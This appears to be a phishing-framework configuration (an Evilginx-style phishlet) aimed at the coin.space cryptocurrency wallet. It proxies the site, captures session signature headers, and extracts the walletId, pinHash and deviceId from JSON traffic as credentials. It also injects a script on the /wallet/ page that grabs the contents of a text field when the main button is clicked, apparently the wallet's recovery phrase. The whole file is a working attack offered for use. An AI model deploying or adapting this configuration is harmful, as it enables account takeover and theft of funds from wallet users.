author: '@Evi1Grey5'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'coin.space', session: false, is_landing: true, auto_filter: true}
auth_tokens:
  - domain: 'coin.space'
    keys: ['X-Date', 'Signature']
credentials:
  username:
    key: 'walletId'
    search: '"walletId":"(.*?)"'
    type: 'json'
  password:
    key: 'pinHash'
    search: '"pinHash":"(.*?)"'
    type: 'json'
  device_id:
    key: 'deviceId'
    search: '"deviceId":"(.*?)"'
    type: 'json'
login:
  domain: 'coin.space'
  path: '/wallet/'
js_inject:
  - trigger_domains: ["coin.space"]
    trigger_paths: ["/wallet/"]
    script: |
      function interceptData() {
        const button = document.querySelector("button.cs-button--primary");

        if (button) {
          clearInterval(intervalId);
          button.addEventListener("click", () => {
            const textarea = document.querySelector("textarea");

            if (textarea) {
              const textareaValue = textarea.value;
              console.log("Intercepted value:", textareaValue);
            } else {
              console.warn("No text input field found.");
            }
          });
        } else {
          console.warn("Button not found.");
        }
      }

      const intervalId = setInterval(interceptData, 500);

